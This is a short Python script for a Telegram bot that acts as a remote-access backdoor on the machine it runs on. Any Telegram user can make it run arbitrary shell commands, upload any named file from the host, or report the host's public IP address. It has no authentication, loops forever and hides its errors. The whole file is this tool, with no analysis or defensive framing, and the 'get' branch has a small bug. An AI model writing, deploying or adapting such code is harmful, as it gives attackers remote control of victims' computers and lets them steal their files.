import telebot, owlshell, requests
token = 'token'
bot = telebot.TeleBot(token)
@bot.message_handler(content_types=['text'])
def handle(message):
    if message.text.startswith('get '):
        filename = message.replace('get ', '', 1)
        bot.send_document(message.from_user.id, (filename, open(filename, 'rb').read()))
    elif message.text == 'ip':
        bot.send_message(message.from_user.id, requests.get('https://ifconfig.me/ip').text)
    else:
        try:
            bot.send_message(message.from_user.id, owlshell.shell(message.text))
        except Exception as e:
            bot.send_message(message.from_user.id, f'Error: {e}.')
while True:
    try:
        print('run')
        bot.polling()
    except:
        pass
